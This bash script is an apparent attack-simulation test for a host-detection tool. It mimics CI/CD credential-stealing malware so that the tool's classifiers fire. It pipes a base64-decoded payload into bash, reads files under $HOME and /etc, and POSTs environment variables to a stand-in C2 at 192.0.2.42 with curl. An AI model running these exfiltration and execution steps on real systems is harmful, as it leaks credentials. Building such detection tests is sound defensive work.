#!/bin/bash
# tests/attack-sim/cred-steal-megalodon-style.sh
#
# AUTHORIZED SECURITY TEST. Run only on hosts the operator owns.
#
# Mimics the Megalodon CI/CD malware (ox.security 2026) runtime
# fingerprint on a Linux runner:
#   - base64-encoded payload decoded then executed
#   - scans workspace for AWS/GitHub/npm/Slack keys via grep+regex
#   - POSTs to a fake C2 (we use TEST-NET 192.0.2.42)
#
# Expected catches today (xhelix at commit 13c763f or later):
#   - cron_malware_shape Class-1 (base64 -d | sh + curl + tmp script)
#   - binary_runs_from_tmp Class-2 if the payload writes to /tmp
#   - file_read_burst Class-2 (P-AB.13) — many file opens in 10s
#   - process_spawn_burst Class-2 (P-AB.13) — many child PIDs
#   - outbound_to_known_bad Class-1 if 192.0.2.42 is in static IOCs
#
# After USG fully built:
#   - all reads of sealed credential files return ciphertext only
#   - tainted-egress denies the POST regardless of dest IP
#   - honey credentials served to the unauthorized lineage

set -u
ATTACKER_URL="http://192.0.2.42:8080/megalodon"

log() { echo "[megalodon-sim $(date +%H:%M:%S)] $*"; }
log "=== Megalodon-style payload starting as $(whoami) ==="

# Step 1: drop and execute a base64-decoded payload (the canonical
# Megalodon shape — the cron_malware_shape classifier should fire
# on this exact pattern)
TMPSCRIPT="/tmp/.megalodon-test-$$.sh"
PAYLOAD_B64="$(echo '#!/bin/bash
echo megalodon-payload-running
' | base64)"

log "writing payload to $TMPSCRIPT"
echo "$PAYLOAD_B64" | base64 -d > "$TMPSCRIPT"
chmod +x "$TMPSCRIPT"

# Run it through the canonical shell-pipe pattern. This is exactly
# what cron_malware_shape and cron_b64 classifiers detect.
echo "$PAYLOAD_B64" | base64 -d | bash 2>&1 | head -1

# Step 2: workspace credential scan (the regex-burst stage that
# file_read_burst from P-AB.13 should catch). We open many files
# in quick succession.
log "--- workspace regex scan (high file-open rate) ---"
COUNT=0
for d in "$HOME" /etc /tmp /var/www; do
    [ -d "$d" ] || continue
    while IFS= read -r -d '' f; do
        # Reading a tiny prefix is enough to trigger the open() —
        # we don't actually need the content for the simulation.
        head -c 256 "$f" > /dev/null 2>&1 || true
        COUNT=$((COUNT + 1))
        [ "$COUNT" -ge 120 ] && break 2
    done < <(find "$d" -maxdepth 3 -type f -print0 2>/dev/null)
done
log "opened ~$COUNT files"

# Step 3: exfil
log "--- exfil attempt → $ATTACKER_URL ---"
timeout 3 curl -s -m 2 --connect-timeout 2 \
    -X POST "$ATTACKER_URL" \
    -H "X-Megalodon-Agent: cicd-payload" \
    -d "creds=$(env | head -c 1024)" 2>&1 | head -1 || true

# Step 4: spawn-rate burst (mimics process-enumeration loops typical
# of TeamTNT-style credential harvesters)
log "--- spawn-rate burst (should trigger process_spawn_burst) ---"
for i in $(seq 1 30); do
    (sleep 0.01 && true) &
done
wait

# Cleanup
rm -f "$TMPSCRIPT"
log "=== Megalodon-style payload finished ==="
